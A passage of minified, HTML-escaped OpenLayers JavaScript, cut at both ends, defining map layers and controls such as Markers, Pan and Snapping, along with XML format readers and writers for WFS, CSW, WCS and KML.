if("OpenLayers.Geometry.Point"!=f.CLASS_NAME)throw new TypeError("Only features with point geometries are supported.");if(0&lt;g){d=null!=this.dataFrom? a[g+this.dataFrom].data||a[g+this.dataFrom].attributes:null;var k=null!=this.styleFrom?a[g+this.styleFrom].style:null;e=new OpenLayers.Geometry.LineString([e,f]);c[g-1]=new OpenLayers.Feature.Vector(e,d,k)}e=f}this.addFeatures(c,b)},CLASS_NAME:"OpenLayers.Layer.PointTrack"});OpenLayers.Layer.PointTrack.SOURCE_NODE=-1;OpenLayers.Layer.PointTrack.TARGET_NODE=0;OpenLayers.Layer.PointTrack.dataFrom={SOURCE_NODE:-1,TARGET_NODE:0};OpenLayers.Protocol.WFS=function(a){a=OpenLayers.Util.applyDefaults(a,OpenLayers.Protocol.WFS.DEFAULTS);var b=OpenLayers.Protocol.WFS["v"+a.version.replace(/\./g,"_")];if(!b)throw"Unsupported WFS version: "+a.version;return new b(a)}; OpenLayers.Protocol.WFS.fromWMSLayer=function(a,b){var c,d;c=a.params.LAYERS;c=(OpenLayers.Util.isArray(c)?c[0]:c).split(":");1&lt;c.length&amp;&amp;(d=c[0]);c=c.pop();d={url:a.url,featureType:c,featurePrefix:d,srsName:a.projection&amp;&amp;a.projection.getCode()||a.map&amp;&amp;a.map.getProjectionObject().getCode(),version:"1.1.0"};return new OpenLayers.Protocol.WFS(OpenLayers.Util.applyDefaults(b,d))};OpenLayers.Protocol.WFS.DEFAULTS={version:"1.0.0"};OpenLayers.Layer.Markers=OpenLayers.Class(OpenLayers.Layer,{isBaseLayer:!1,markers:null,drawn:!1,initialize:function(a,b){OpenLayers.Layer.prototype.initialize.apply(this,arguments);this.markers=[]},destroy:function(){this.clearMarkers();this.markers=null;OpenLayers.Layer.prototype.destroy.apply(this,arguments)},setOpacity:function(a){if(a!=this.opacity){this.opacity=a;a=0;for(var b=this.markers.length;a&lt;b;a++)this.markers[a].setOpacity(this.opacity)}},moveTo:function(a,b,c){OpenLayers.Layer.prototype.moveTo.apply(this, arguments);if(b||!this.drawn){for(var d=0,e=this.markers.length;d&lt;e;d++)this.drawMarker(this.markers[d]);this.drawn=!0}},addMarker:function(a){this.markers.push(a);1>this.opacity&amp;&amp;a.setOpacity(this.opacity);this.map&amp;&amp;this.map.getExtent()&amp;&amp;(a.map=this.map,this.drawMarker(a))},removeMarker:function(a){this.markers&amp;&amp;this.markers.length&amp;&amp;(OpenLayers.Util.removeItem(this.markers,a),a.erase())},clearMarkers:function(){if(null!=this.markers)for(;0&lt;this.markers.length;)this.removeMarker(this.markers[0])}, drawMarker:function(a){var b=this.map.getLayerPxFromLonLat(a.lonlat);null==b?a.display(!1):a.isDrawn()?a.icon&amp;&amp;a.icon.moveTo(b):(a=a.draw(b),this.div.appendChild(a))},getDataExtent:function(){var a=null;if(this.markers&amp;&amp;0&lt;this.markers.length)for(var a=new OpenLayers.Bounds,b=0,c=this.markers.length;b&lt;c;b++)a.extend(this.markers[b].lonlat);return a},CLASS_NAME:"OpenLayers.Layer.Markers"});OpenLayers.Control.Pan=OpenLayers.Class(OpenLayers.Control.Button,{slideFactor:50,slideRatio:null,direction:null,initialize:function(a,b){this.direction=a;this.CLASS_NAME+=this.direction;OpenLayers.Control.prototype.initialize.apply(this,[b])},trigger:function(){if(this.map){var a=OpenLayers.Function.bind(function(a){return this.slideRatio?this.map.getSize()[a]*this.slideRatio:this.slideFactor},this);switch(this.direction){case OpenLayers.Control.Pan.NORTH:this.map.pan(0,-a("h"));break;case OpenLayers.Control.Pan.SOUTH:this.map.pan(0, a("h"));break;case OpenLayers.Control.Pan.WEST:this.map.pan(-a("w"),0);break;case OpenLayers.Control.Pan.EAST:this.map.pan(a("w"),0)}}},CLASS_NAME:"OpenLayers.Control.Pan"});OpenLayers.Control.Pan.NORTH="North";OpenLayers.Control.Pan.SOUTH="South";OpenLayers.Control.Pan.EAST="East";OpenLayers.Control.Pan.WEST="West";OpenLayers.Format.CSWGetDomain=function(a){a=OpenLayers.Util.applyDefaults(a,OpenLayers.Format.CSWGetDomain.DEFAULTS);var b=OpenLayers.Format.CSWGetDomain["v"+a.version.replace(/\./g,"_")];if(!b)throw"Unsupported CSWGetDomain version: "+a.version;return new b(a)};OpenLayers.Format.CSWGetDomain.DEFAULTS={version:"2.0.2"};OpenLayers.Format.CSWGetDomain.v2_0_2=OpenLayers.Class(OpenLayers.Format.XML,{namespaces:{xlink:"http://www.w3.org/1999/xlink",xsi:"http://www.w3.org/2001/XMLSchema-instance",csw:"http://www.opengis.net/cat/csw/2.0.2"},defaultPrefix:"csw",version:"2.0.2",schemaLocation:"http://www.opengis.net/cat/csw/2.0.2 http://schemas.opengis.net/csw/2.0.2/CSW-discovery.xsd",PropertyName:null,ParameterName:null,read:function(a){"string"==typeof a&amp;&amp;(a=OpenLayers.Format.XML.prototype.read.apply(this,[a]));a&amp;&amp;9== a.nodeType&amp;&amp;(a=a.documentElement);var b={};this.readNode(a,b);return b},readers:{csw:{GetDomainResponse:function(a,b){this.readChildNodes(a,b)},DomainValues:function(a,b){OpenLayers.Util.isArray(b.DomainValues)||(b.DomainValues=[]);for(var c=a.attributes,d={},e=0,f=c.length;e&lt;f;++e)d[c[e].name]=c[e].nodeValue;this.readChildNodes(a,d);b.DomainValues.push(d)},PropertyName:function(a,b){b.PropertyName=this.getChildValue(a)},ParameterName:function(a,b){b.ParameterName=this.getChildValue(a)},ListOfValues:function(a, b){OpenLayers.Util.isArray(b.ListOfValues)||(b.ListOfValues=[]);this.readChildNodes(a,b.ListOfValues)},Value:function(a,b){for(var c=a.attributes,d={},e=0,f=c.length;e&lt;f;++e)d[c[e].name]=c[e].nodeValue;d.value=this.getChildValue(a);b.push({Value:d})},ConceptualScheme:function(a,b){b.ConceptualScheme={};this.readChildNodes(a,b.ConceptualScheme)},Name:function(a,b){b.Name=this.getChildValue(a)},Document:function(a,b){b.Document=this.getChildValue(a)},Authority:function(a,b){b.Authority=this.getChildValue(a)}, RangeOfValues:function(a,b){b.RangeOfValues={};this.readChildNodes(a,b.RangeOfValues)},MinValue:function(a,b){for(var c=a.attributes,d={},e=0,f=c.length;e&lt;f;++e)d[c[e].name]=c[e].nodeValue;d.value=this.getChildValue(a);b.MinValue=d},MaxValue:function(a,b){for(var c=a.attributes,d={},e=0,f=c.length;e&lt;f;++e)d[c[e].name]=c[e].nodeValue;d.value=this.getChildValue(a);b.MaxValue=d}}},write:function(a){a=this.writeNode("csw:GetDomain",a);return OpenLayers.Format.XML.prototype.write.apply(this,[a])},writers:{csw:{GetDomain:function(a){var b= this.createElementNSPlus("csw:GetDomain",{attributes:{service:"CSW",version:this.version}});a.PropertyName||this.PropertyName?this.writeNode("csw:PropertyName",a.PropertyName||this.PropertyName,b):(a.ParameterName||this.ParameterName)&amp;&amp;this.writeNode("csw:ParameterName",a.ParameterName||this.ParameterName,b);this.readChildNodes(b,a);return b},PropertyName:function(a){return this.createElementNSPlus("csw:PropertyName",{value:a})},ParameterName:function(a){return this.createElementNSPlus("csw:ParameterName", {value:a})}}},CLASS_NAME:"OpenLayers.Format.CSWGetDomain.v2_0_2"});OpenLayers.Format.ArcXML.Features=OpenLayers.Class(OpenLayers.Format.XML,{read:function(a){return(new OpenLayers.Format.ArcXML).read(a).features.feature}});OpenLayers.Control.Snapping=OpenLayers.Class(OpenLayers.Control,{DEFAULTS:{tolerance:10,node:!0,edge:!0,vertex:!0},greedy:!0,precedence:["node","vertex","edge"],resolution:null,geoToleranceCache:null,layer:null,feature:null,point:null,initialize:function(a){OpenLayers.Control.prototype.initialize.apply(this,[a]);this.options=a||{};this.options.layer&amp;&amp;this.setLayer(this.options.layer);a=OpenLayers.Util.extend({},this.options.defaults);this.defaults=OpenLayers.Util.applyDefaults(a,this.DEFAULTS);this.setTargets(this.options.targets); 0===this.targets.length&amp;&amp;this.layer&amp;&amp;this.addTargetLayer(this.layer);this.geoToleranceCache={}},setLayer:function(a){this.active?(this.deactivate(),this.layer=a,this.activate()):this.layer=a},setTargets:function(a){this.targets=[];if(a&amp;&amp;a.length)for(var b,c=0,d=a.length;c&lt;d;++c)b=a[c],b instanceof OpenLayers.Layer.Vector?this.addTargetLayer(b):this.addTarget(b)},addTargetLayer:function(a){this.addTarget({layer:a})},addTarget:function(a){a=OpenLayers.Util.applyDefaults(a,this.defaults);a.nodeTolerance= a.nodeTolerance||a.tolerance;a.vertexTolerance=a.vertexTolerance||a.tolerance;a.edgeTolerance=a.edgeTolerance||a.tolerance;this.targets.push(a)},removeTargetLayer:function(a){for(var b,c=this.targets.length-1;0&lt;=c;--c)b=this.targets[c],b.layer===a&amp;&amp;this.removeTarget(b)},removeTarget:function(a){return OpenLayers.Util.removeItem(this.targets,a)},activate:function(){var a=OpenLayers.Control.prototype.activate.call(this);if(a&amp;&amp;this.layer&amp;&amp;this.layer.events)this.layer.events.on({sketchstarted:this.onSketchModified, sketchmodified:this.onSketchModified,vertexmodified:this.onVertexModified,scope:this});return a},deactivate:function(){var a=OpenLayers.Control.prototype.deactivate.call(this);a&amp;&amp;this.layer&amp;&amp;this.layer.events&amp;&amp;this.layer.events.un({sketchstarted:this.onSketchModified,sketchmodified:this.onSketchModified,vertexmodified:this.onVertexModified,scope:this});this.point=this.feature=null;return a},onSketchModified:function(a){this.feature=a.feature;this.considerSnapping(a.vertex,a.vertex)},onVertexModified:function(a){this.feature= a.feature;var b=this.layer.map.getLonLatFromViewPortPx(a.pixel);this.considerSnapping(a.vertex,new OpenLayers.Geometry.Point(b.lon,b.lat))},considerSnapping:function(a,b){for(var c={rank:Number.POSITIVE_INFINITY,dist:Number.POSITIVE_INFINITY,x:null,y:null},d=!1,e,f,g=0,h=this.targets.length;g&lt;h;++g)if(f=this.targets[g],e=this.testTarget(f,b))if(this.greedy){c=e;c.target=f;d=!0;break}else if(e.rank&lt;c.rank||e.rank===c.rank&amp;&amp;e.dist&lt;c.dist)c=e,c.target=f,d=!0;d&amp;&amp;(!1!==this.events.triggerEvent("beforesnap", {point:a,x:c.x,y:c.y,distance:c.dist,layer:c.target.layer,snapType:this.precedence[c.rank]})?(a.x=c.x,a.y=c.y,this.point=a,this.events.triggerEvent("snap",{point:a,snapType:this.precedence[c.rank],layer:c.target.layer,distance:c.dist})):d=!1);this.point&amp;&amp;!d&amp;&amp;(a.x=b.x,a.y=b.y,this.point=null,this.events.triggerEvent("unsnap",{point:a}))},testTarget:function(a,b){var c=this.layer.map.getResolution();if("minResolution"in a&amp;&amp;c&lt;a.minResolution||"maxResolution"in a&amp;&amp;c>=a.maxResolution)return null;for(var c= {node:this.getGeoTolerance(a.nodeTolerance,c),vertex:this.getGeoTolerance(a.vertexTolerance,c),edge:this.getGeoTolerance(a.edgeTolerance,c)},d=Math.max(c.node,c.vertex,c.edge),e={rank:Number.POSITIVE_INFINITY,dist:Number.POSITIVE_INFINITY},f=!1,g=a.layer.features,h,k,l,m,n,p,q=this.precedence.length,r=new OpenLayers.LonLat(b.x,b.y),s=0,t=g.length;s&lt;t;++s)if(h=g[s],h!==this.feature&amp;&amp;(!h._sketch&amp;&amp;h.state!==OpenLayers.State.DELETE&amp;&amp;(!a.filter||a.filter.evaluate(h)))&amp;&amp;h.atPoint(r,d,d))for(var u=0,v=Math.min(e.rank+ 1,q);u&lt;v;++u)if(k=this.precedence[u],a[k])if("edge"===k){if(l=h.geometry.distanceTo(b,{details:!0}),n=l.distance,n&lt;=c[k]&amp;&amp;n&lt;e.dist){e={rank:u,dist:n,x:l.x0,y:l.y0};f=!0;break}}else{l=h.geometry.getVertices("node"===k);p=!1;for(var w=0,x=l.length;w&lt;x;++w)m=l[w],n=m.distanceTo(b),n&lt;=c[k]&amp;&amp;(u&lt;e.rank||u===e.rank&amp;&amp;n&lt;e.dist)&amp;&amp;(e={rank:u,dist:n,x:m.x,y:m.y},p=f=!0);if(p)break}return f?e:null},getGeoTolerance:function(a,b){b!==this.resolution&amp;&amp;(this.resolution=b,this.geoToleranceCache={});var c=this.geoToleranceCache[a]; void 0===c&amp;&amp;(c=a*b,this.geoToleranceCache[a]=c);return c},destroy:function(){this.active&amp;&amp;this.deactivate();delete this.layer;delete this.targets;OpenLayers.Control.prototype.destroy.call(this)},CLASS_NAME:"OpenLayers.Control.Snapping"});OpenLayers.Format.OWSCommon.v1_1_0=OpenLayers.Class(OpenLayers.Format.OWSCommon.v1,{namespaces:{ows:"http://www.opengis.net/ows/1.1",xlink:"http://www.w3.org/1999/xlink"},readers:{ows:OpenLayers.Util.applyDefaults({ExceptionReport:function(a,b){b.exceptionReport={version:a.getAttribute("version"),language:a.getAttribute("xml:lang"),exceptions:[]};this.readChildNodes(a,b.exceptionReport)},AllowedValues:function(a,b){b.allowedValues={};this.readChildNodes(a,b.allowedValues)},AnyValue:function(a,b){b.anyValue= !0},DataType:function(a,b){b.dataType=this.getChildValue(a)},Range:function(a,b){b.range={};this.readChildNodes(a,b.range)},MinimumValue:function(a,b){b.minValue=this.getChildValue(a)},MaximumValue:function(a,b){b.maxValue=this.getChildValue(a)},Identifier:function(a,b){b.identifier=this.getChildValue(a)},SupportedCRS:function(a,b){b.supportedCRS=this.getChildValue(a)}},OpenLayers.Format.OWSCommon.v1.prototype.readers.ows)},writers:{ows:OpenLayers.Util.applyDefaults({Range:function(a){var b=this.createElementNSPlus("ows:Range", {attributes:{"ows:rangeClosure":a.closure}});this.writeNode("ows:MinimumValue",a.minValue,b);this.writeNode("ows:MaximumValue",a.maxValue,b);return b},MinimumValue:function(a){return this.createElementNSPlus("ows:MinimumValue",{value:a})},MaximumValue:function(a){return this.createElementNSPlus("ows:MaximumValue",{value:a})},Value:function(a){return this.createElementNSPlus("ows:Value",{value:a})}},OpenLayers.Format.OWSCommon.v1.prototype.writers.ows)},CLASS_NAME:"OpenLayers.Format.OWSCommon.v1_1_0"});OpenLayers.Format.WCSGetCoverage=OpenLayers.Class(OpenLayers.Format.XML,{namespaces:{ows:"http://www.opengis.net/ows/1.1",wcs:"http://www.opengis.net/wcs/1.1",xlink:"http://www.w3.org/1999/xlink",xsi:"http://www.w3.org/2001/XMLSchema-instance"},regExes:{trimSpace:/^\s*|\s*$/g,removeSpace:/\s*/g,splitSpace:/\s+/,trimComma:/\s*,\s*/g},VERSION:"1.1.2",schemaLocation:"http://www.opengis.net/wcs/1.1 http://schemas.opengis.net/wcs/1.1/wcsGetCoverage.xsd",write:function(a){a=this.writeNode("wcs:GetCoverage", a);this.setAttributeNS(a,this.namespaces.xsi,"xsi:schemaLocation",this.schemaLocation);return OpenLayers.Format.XML.prototype.write.apply(this,[a])},writers:{wcs:{GetCoverage:function(a){var b=this.createElementNSPlus("wcs:GetCoverage",{attributes:{version:a.version||this.VERSION,service:"WCS"}});this.writeNode("ows:Identifier",a.identifier,b);this.writeNode("wcs:DomainSubset",a.domainSubset,b);this.writeNode("wcs:Output",a.output,b);return b},DomainSubset:function(a){var b=this.createElementNSPlus("wcs:DomainSubset", {});this.writeNode("ows:BoundingBox",a.boundingBox,b);a.temporalSubset&amp;&amp;this.writeNode("wcs:TemporalSubset",a.temporalSubset,b);return b},TemporalSubset:function(a){for(var b=this.createElementNSPlus("wcs:TemporalSubset",{}),c=0,d=a.timePeriods.length;c&lt;d;++c)this.writeNode("wcs:TimePeriod",a.timePeriods[c],b);return b},TimePeriod:function(a){var b=this.createElementNSPlus("wcs:TimePeriod",{});this.writeNode("wcs:BeginPosition",a.begin,b);this.writeNode("wcs:EndPosition",a.end,b);a.resolution&amp;&amp;this.writeNode("wcs:TimeResolution", a.resolution,b);return b},BeginPosition:function(a){return this.createElementNSPlus("wcs:BeginPosition",{value:a})},EndPosition:function(a){return this.createElementNSPlus("wcs:EndPosition",{value:a})},TimeResolution:function(a){return this.createElementNSPlus("wcs:TimeResolution",{value:a})},Output:function(a){var b=this.createElementNSPlus("wcs:Output",{attributes:{format:a.format,store:a.store}});a.gridCRS&amp;&amp;this.writeNode("wcs:GridCRS",a.gridCRS,b);return b},GridCRS:function(a){var b=this.createElementNSPlus("wcs:GridCRS", {});this.writeNode("wcs:GridBaseCRS",a.baseCRS,b);a.type&amp;&amp;this.writeNode("wcs:GridType",a.type,b);a.origin&amp;&amp;this.writeNode("wcs:GridOrigin",a.origin,b);this.writeNode("wcs:GridOffsets",a.offsets,b);a.CS&amp;&amp;this.writeNode("wcs:GridCS",a.CS,b);return b},GridBaseCRS:function(a){return this.createElementNSPlus("wcs:GridBaseCRS",{value:a})},GridOrigin:function(a){return this.createElementNSPlus("wcs:GridOrigin",{value:a})},GridType:function(a){return this.createElementNSPlus("wcs:GridType",{value:a})},GridOffsets:function(a){return this.createElementNSPlus("wcs:GridOffsets", {value:a})},GridCS:function(a){return this.createElementNSPlus("wcs:GridCS",{value:a})}},ows:OpenLayers.Format.OWSCommon.v1_1_0.prototype.writers.ows},CLASS_NAME:"OpenLayers.Format.WCSGetCoverage"});OpenLayers.Format.KML=OpenLayers.Class(OpenLayers.Format.XML,{namespaces:{kml:"http://www.opengis.net/kml/2.2",gx:"http://www.google.com/kml/ext/2.2"},kmlns:"http://earth.google.com/kml/2.0",placemarksDesc:"No description available",foldersName:"OpenLayers export",foldersDesc:"Exported on "+new Date,extractAttributes:!0,kvpAttributes:!1,extractStyles:!1,extractTracks:!1,trackAttributes:null,internalns:null,features:null,styles:null,styleBaseUrl:"",fetched:null,maxDepth:0,initialize:function(a){this.regExes= {trimSpace:/^\s*|\s*$/g,removeSpace:/\s*/g,splitSpace:/\s+/,trimComma:/\s*,\s*/g,kmlColor:/(\w{2})(\w{2})(\w{2})(\w{2})/,kmlIconPalette:/root:\/\/icons\/palette-(\d+)(\.\w+)/,straightBracket:/\$\[(.*?)\]/g};this.externalProjection=new OpenLayers.Projection("EPSG:4326");OpenLayers.Format.XML.prototype.initialize.apply(this,[a])},read:function(a){this.features=[];this.styles={};this.fetched={};return this.parseData(a,{depth:0,styleBaseUrl:this.styleBaseUrl})},parseData:function(a,b){"string"==typeof a&amp;&amp; (a=OpenLayers.Format.XML.prototype.read.apply(this,[a]));for(var c=["Link","NetworkLink","Style","StyleMap","Placemark"],d=0,e=c.length;d&lt;e;++d){var f=c[d],g=this.getElementsByTagNameNS(a,"*",f);if(0!=g.length)switch(f.toLowerCase()){case "link":case "networklink":this.parseLinks(g,b);break;case "style":this.extractStyles&amp;&amp;this.parseStyles(g,b);break;case "stylemap":this.extractStyles&amp;&amp;this.parseStyleMaps(g,b);break;case "placemark":this.parseFeatures(g,b)}}return this.features},parseLinks:function(a, b){if(b.depth>=this.maxDepth)return!1;var c=OpenLayers.Util.extend({},b);c.depth++;for(var d=0,e=a.length;d&lt;e;d++){var f=this.parseProperty(a[d],"*","href");f&amp;&amp;!this.fetched[f]&amp;&amp;(this.fetched[f]=!0,(f=this.fetchLink(f))&amp;&amp;this.parseData(f,c))}},fetchLink:function(a){if(a=OpenLayers.Request.GET({url:a,async:!1}))return a.responseText},parseStyles:function(a,b){for(var c=0,d=a.length;c&lt;d;c++){var e=this.parseStyle(a[c]);e&amp;&amp;(this.styles[(b.styleBaseUrl||"")+"#"+e.id]=e)}},parseKmlColor:function(a){var b= null;a&amp;&amp;(a=a.match(this.regExes.kmlColor))&amp;&amp;(b={color:"#"+a[4]+a[3]+a[2],opacity:parseInt(a[1],16)/255});return b},parseStyle:function(a){for(var b={},c=["LineStyle","PolyStyle","IconStyle","BalloonStyle","LabelStyle"],d,e,f=0,g=c.length;f&lt;g;++f)if(d=c[f],e=this.getElementsByTagNameNS(a,"*",d)[0])switch(d.toLowerCase()){case "linestyle":d=this.parseProperty(e,"*","color");if(d=this.parseKmlColor(d))b.strokeColor=d.color,b.strokeOpacity=d.opacity;(d=this.parseProperty(e,"*","width"))&amp;&amp;(b.strokeWidth= d);break;case "polystyle":d=this.parseProperty(e,"*","color");if(d=this.parseKmlColor(d))b.fillOpacity=d.opacity,b.fillColor=d.color;"0"==this.parseProperty(e,"*","fill")&amp;&amp;(b.fillColor="none");"0"==this.parseProperty(e,"*","outline")&amp;&amp;(b.strokeWidth="0");break;case "iconstyle":var h=parseFloat(this.parseProperty(e,"*","scale")||1);d=32*h;var k=32*h,l=this.getElementsByTagNameNS(e,"*","Icon")[0];if(l){var m=this.parseProperty(l,"*","href");if(m){var n=this.parseProperty(l,"*","w"),p=this.parseProperty(l, "*","h");!OpenLayers.String.startsWith(m,"http://maps.google.com/mapfiles/kml")||(n||p)||(p=n=64,h/=2);n=n||p;p=p||n;n&amp;&amp;(d=parseInt(n)*h);p&amp;&amp;(k=parseInt(p)*h);if(p=m.match(this.regExes.kmlIconPalette))n=p[1],p=p[2],m=this.parseProperty(l,"*","x"),l=this.parseProperty(l,"*","y"),m="http://maps.google.com/mapfiles/kml/pal"+n+"/icon"+(8*(l?7-l/32:7)+(m?m/32:0))+p;b.graphicOpacity=1;b.externalGraphic=m}}if(e=this.getElementsByTagNameNS(e,"*","hotSpot")[0])m=parseFloat(e.getAttribute("x")),l=parseFloat(e.getAttribute("y")), n=e.getAttribute("xunits"),"pixels"==n?b.graphicXOffset=-m*h:"insetPixels"==n?b.graphicXOffset=-d+m*h:"fraction"==n&amp;&amp;(b.graphicXOffset=-d*m),e=e.getAttribute("yunits"),"pixels"==e?b.graphicYOffset=-k+l*h+1:"insetPixels"==e?b.graphicYOffset=-(l*h)+1:"fraction"==e&amp;&amp;(b.graphicYOffset=-k*(1-l)+1);b.graphicWidth=d;b.graphicHeight=k;break;case "balloonstyle":(e=OpenLayers.Util.getXmlNodeValue(e))&amp;&amp;(b.balloonStyle=e.replace(this.regExes.straightBracket,"${$1}"));break;case "labelstyle":if(d=this.parseProperty(e, "*","color"),d=this.parseKmlColor(d))b.fontColor=d.color,b.fontOpacity=d.opacity}!b.strokeColor&amp;&amp;b.fillColor&amp;&amp;(b.strokeColor=b.fillColor);(a=a.getAttribute("id"))&amp;&amp;b&amp;&amp;(b.id=a);return b},parseStyleMaps:function(a,b){for(var c=0,d=a.length;c&lt;d;c++)for(var e=a[c],f=this.getElementsByTagNameNS(e,"*","Pair"),e=e.getAttribute("id"),g=0,h=f.length;g&lt;h;g++){var k=f[g],l=this.parseProperty(k,"*","key");(k=this.parseProperty(k,"*","styleUrl"))&amp;&amp;"normal"==l&amp;&amp;(this.styles[(b.styleBaseUrl||"")+"#"+e]=this.styles[(b.styleBaseUrl|| "")+k])}},parseFeatures:function(a,b){for(var c=[],d=0,e=a.length;d&lt;e;d++){var f=a[d],g=this.parseFeature.apply(this,[f]);if(g){this.extractStyles&amp;&amp;(g.attributes&amp;&amp;g.attributes.styleUrl)&amp;&amp;(g.style=this.getStyle(g.attributes.styleUrl,b));if(this.extractStyles){var h=this.getElementsByTagNameNS(f,"*","Style")[0];h&amp;&amp;(h=this.parseStyle(h))&amp;&amp;(g.style=OpenLayers.Util.extend(g.style,h))}this.extractTracks?(f=this.getElementsByTagNameNS(f,this.namespaces.gx,"Track"))&amp;&amp;0&lt;f.length&amp;&amp;(g={features:[],feature:g}, this.readNode(f[0],g),0&lt;g.features.length&amp;&amp;c.push.apply(c,g.features)):c.push(g)}else throw"Bad Placemark: "+d;}this.features=this.features.concat(c)},readers:{kml:{when:function(a,b){b.whens.push(OpenLayers.Date.parse(this.getChildValue(a)))},_trackPointAttribute:function(a,b){var c=a.nodeName.split(":").pop();b.attributes[c].push(this.getChildValue(a))}},gx:{Track:function(a,b){var c={whens:[],points:[],angles:[]};if(this.trackAttributes){var d;c.attributes={};for(var e=0,f=this.trackAttributes.length;e&lt; f;++e)d=this.trackAttributes[e],c.attributes[d]=[],d in this.readers.kml||(this.readers.kml[d]=this.readers.kml._trackPointAttribute)}this.readChildNodes(a,c);if(c.whens.length!==c.points.length)throw Error("gx:Track with unequal number of when ("+c.whens.length+") and gx:coord ("+c.points.length+") elements.");var g=0&lt;c.angles.length;if(g&amp;&amp;c.whens.length!==c.angles.length)throw Error("gx:Track with unequal number of when ("+c.whens.length+") and gx:angles ("+c.angles.length+") elements.");for(var h, e=0,f=c.whens.length;e&lt;f;++e){h=b.feature.clone();h.fid=b.feature.fid||b.feature.id;d=c.points[e];h.geometry=d;"z"in d&amp;&amp;(h.attributes.altitude=d.z);this.internalProjection&amp;&amp;this.externalProjection&amp;&amp;h.geometry.transform(this.externalProjection,this.internalProjection);if(this.trackAttributes)for(var k=0,l=this.trackAttributes.length;k&lt;l;++k)d=this.trackAttributes[k],h.attributes[d]=c.attributes[d][e];h.attributes.when=c.whens[e];h.attributes.trackId=b.feature.id;g&amp;&amp;(d=c.angles[e],h.attributes.heading= parseFloat(d[0]),h.attributes.tilt=parseFloat(d[1]),h.attributes.roll=parseFloat(d[2]));b.features.push(h)}},coord:function(a,b){var c=this.getChildValue(a).replace(this.regExes.trimSpace,"").split(/\s+/),d=new OpenLayers.Geometry.Point(c[0],c[1]);2&lt;c.length&amp;&amp;(d.z=parseFloat(c[2]));b.points.push(d)},angles:function(a,b){var c=this.getChildValue(a).replace(this.regExes.trimSpace,"").split(/\s+/);b.angles.push(c)}}},parseFeature:function(a){for(var b=["MultiGeometry","Polygon","LineString","Point"], c,d,e,f=0,g=b.length;f&lt;g;++f)if(c=b[f],this.internalns=a.namespaceURI?a.namespaceURI:this.kmlns,d=this.getElementsByTagNameNS(a,this.internalns,c),0&lt;d.length){if(b=this.parseGeometry[c.toLowerCase()])e=b.apply(this,[d[0]]),this.internalProjection&amp;&amp;this.externalProjection&amp;&amp;e.transform(this.externalProjection,this.internalProjection);else throw new TypeError("Unsupported geometry type: "+c);break}var h;this.extractAttributes&amp;&amp;(h=this.parseAttributes(a));c=new OpenLayers.Feature.Vector(e,h);a=a.getAttribute("id")|| a.getAttribute("name");null!=a&amp;&amp;(c.fid=a);return c},getStyle:function(a,b){var c=OpenLayers.Util.removeTail(a),d=OpenLayers.Util.extend({},b);d.depth++;d.styleBaseUrl=c;!this.styles[a]&amp;&amp;!OpenLayers.String.startsWith(a,"#")&amp;&amp;d.depth&lt;=this.maxDepth&amp;&amp;!this.fetched[c]&amp;&amp;(c=this.fetchLink(c))&amp;&amp;this.parseData(c,d);return OpenLayers.Util.extend({},this.styles[a])},parseGeometry:{point:function(a){var b=this.getElementsByTagNameNS(a,this.internalns,"coordinates");a=[];if(0&lt;b.length){var c=b[0].firstChild.nodeValue, c=c.replace(this.regExes.removeSpace,"");a=c.split(",")}b=null;if(1&lt;a.length)2==a.length&amp;&amp;(a[2]=null),b=new OpenLayers.Geometry.Point(a[0],a[1],a[2]);else throw"Bad coordinate string: "+c;return b},linestring:function(a,b){var c=this.getElementsByTagNameNS(a,this.internalns,"coordinates"),d=null;if(0&lt;c.length){for(var c=this.getChildValue(c[0]),c=c.replace(this.regExes.trimSpace,""),c=c.replace(this.regExes.trimComma,","),d=c.split(this.regExes.splitSpace),e=d.length,f=Array(e),g,h,k=0;k&lt;e;++k)if(g= d[k].split(","),h=g.length,1&lt;h)2==g.length&amp;&amp;(g[2]=null),f[k]=new OpenLayers.Geometry.Point(g[0],g[1],g[2]);else throw"Bad LineString point coordinates: "+d[k];if(e)d=b?new OpenLayers.Geometry.LinearRing(f):new OpenLayers.Geometry.LineString(f);else throw"Bad LineString coordinates: "+c;}return d},polygon:function(a){a=this.getElementsByTagNameNS(a,this.internalns,"LinearRing");var b=a.length,c=Array(b);if(0&lt;b)for(var d=0,e=a.length;d&lt;e;++d)if(b=this.parseGeometry.linestring.apply(this,[a[d],!0]))c[d]= b;else throw"Bad LinearRing geometry: "+d;return new OpenLayers.Geometry.Polygon(c)},multigeometry:function(a){for(var b,c=[],d=a.childNodes,e=0,f=d.length;e&lt;f;++e)a=d[e],1==a.nodeType&amp;&amp;(b=a.prefix?a.nodeName.split(":")[1]:a.nodeName,(b=this.parseGeometry[b.toLowerCase()])&amp;&amp;c.push(b.apply(this,[a])));return new OpenLayers.Geometry.Collection(c)}},parseAttributes:function(a){var b={},c=a.getElementsByTagName("ExtendedData");c.length&amp;&amp;(b=this.parseExtendedData(c[0]));var d,e,f;a=a.childNodes;for(var c= 0,g=a.length;c&lt;g;++c)if(d=a[c],1==d.nodeType&amp;&amp;(e=d.childNodes,1&lt;=e.length&amp;&amp;3>=e.length)){switch(e.length){case 1:f=e[0];break;case 2:f=e[0];e=e[1];f=3==f.nodeType||4==f.nodeType?f:e;break;default:f=e[1]}if(3==f.nodeType||4==f.nodeType)if(d=d.prefix?d.nodeName.split(":")[1]:d.nodeName,f=OpenLayers.Util.getXmlNodeValue(f))f=f.replace(this.regExes.trimSpace,""),b[d]=f}return b},parseExtendedData:function(a){var b={},c,d,e,f,g=a.getElementsByTagName("Data");c=0;for(d=g.length;c&lt;d;c++){e=g[c];f=e.getAttribute("name"); var h={},k=e.getElementsByTagName("value");k.length&amp;&amp;(h.value=this.getChildValue(k[0]));this.kvpAttributes?b[f]=h.value:(e=e.getElementsByTagName("displayName"),e.length&amp;&amp;(h.displayName=this.getChildValue(e[0])),b[f]=h)}a=a.getElementsByTagName("SimpleData");c=0;for(d=a.length;c&lt;d;c++)h={},e=a[c],f=e.getAttribute("name"),h.value=this.getChildValue(e),this.kvpAttributes?b[f]=h.value:(h.displayName=f,b[f]=h);return b},parseProperty:function(a,b,c){var d;a=this.getElementsByTagNameNS(a,b,c);try{d=OpenLayers.Util.getXmlNodeValue(a[0])}catch(e){d= null}return d},write:function(a){OpenLayers.Util.isArray(a)||(a=[a]);for(var b=this.createElementNS(this.kmlns,"kml"),c=this.createFolderXML(),d=0,e=a.length;d&lt;e;++d)c.appendChild(this.createPlacemarkXML(a[d]));b.appendChild(c);return OpenLayers.Format.XML.prototype.write.apply(this,[b])},createFolderXML:function(){var a=this.createElementNS(this.kmlns,"Folder");if(this.foldersName){var 